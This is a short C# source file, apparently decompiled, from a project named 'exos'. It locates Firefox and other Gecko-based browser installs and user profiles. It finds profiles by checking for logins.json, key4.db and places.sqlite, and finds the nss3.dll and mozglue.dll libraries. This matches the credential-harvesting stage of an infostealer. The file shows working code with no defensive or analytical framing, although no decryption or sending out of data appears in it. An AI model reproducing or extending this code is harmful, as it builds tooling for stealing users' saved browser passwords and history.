using System;
using System.Collections.Generic;
using System.IO;

namespace exos;

internal class Profile
{
	private static string[] Concat(string[] x, string[] y)
	{
		if (x == null)
		{
			throw new ArgumentNullException("x");
		}
		if (y == null)
		{
			throw new ArgumentNullException("y");
		}
		int destinationIndex = x.Length;
		Array.Resize(ref x, x.Length + y.Length);
		Array.Copy(y, 0, x, destinationIndex, y.Length);
		return x;
	}

	private static string[] ProgramFilesChildren()
	{
		string[] array = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
		if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
		{
			array = Concat(array, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
		}
		return array;
	}

	public static string GetProfile(string path)
	{
		try
		{
			string path2 = Path.Combine(path, "Profiles");
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\logins.json") || File.Exists(text + "\\key4.db") || File.Exists(text + "\\places.sqlite"))
					{
						return text;
					}
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Failed to find profile\n" + ex);
		}
		return null;
	}

	public static string GetMozillaPath()
	{
		string[] array = ProgramFilesChildren();
		foreach (string text in array)
		{
			if (File.Exists(text + "\\nss3.dll") && File.Exists(text + "\\mozglue.dll"))
			{
				return text;
			}
		}
		return null;
	}

	public static string[] GetMozillaBrowsers()
	{
		List<string> list = new List<string>();
		string[] sGeckoBrowserPaths = Paths.sGeckoBrowserPaths;
		foreach (string path in sGeckoBrowserPaths)
		{
			string text = Path.Combine(Paths.appdata, path);
			if (Directory.Exists(text))
			{
				list.Add(text);
			}
		}
		return list.ToArray();
	}
}
